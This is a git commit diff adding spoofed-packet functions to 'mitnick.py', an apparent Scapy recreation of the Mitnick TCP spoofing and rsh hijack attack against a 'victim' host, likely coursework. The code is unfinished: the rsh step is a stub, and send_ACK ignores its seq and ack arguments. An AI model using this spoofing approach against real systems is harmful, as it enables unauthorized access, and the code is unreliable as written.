343de70816d5eddc0f8df3fc07829ff78a39030c
alakbarz <me@alak.bar>
2021-03-02 20:22:42 +0000

    oopsie

--- mitnick.py
+++ mitnick.py
@@ -31,4 +31,23 @@ def send_SYN(sip, dip, sport, dport):
 		print("Error: TCP flag not set to SYN in send_SYN function. Quitting...")
 		quit()
 
+def send_ACK(sip, dip, sport, dport, seq, ack):
+	ip = IP(src=sip, dst=dip)
+	tcp = TCP(sport=sport, dport=dport)
+	tcp.flags = "A"
+	packet = ip/tcp
+
+	if tcp.flags == "A":
+		print("Sending ACK to {}:{} from {}:{} with ".format(sip, sport, dip, dport))
+		# ls(packet) # "List available layers, or infos on a given layer class or name."
+		send(packet)
+	else:
+		print("Error: TCP flag not set to ACK in send_ACK function. Quitting...")
+		quit()
+
+def send_RSH_data():
+	print("Something")
+
 send_SYN(srv_ip, x_ip, srv_port, x_port)
+# sniff syn+ack response from victim
+send_ACK(srv_ip, x_ip, srv_port, x_port, seq, ack)
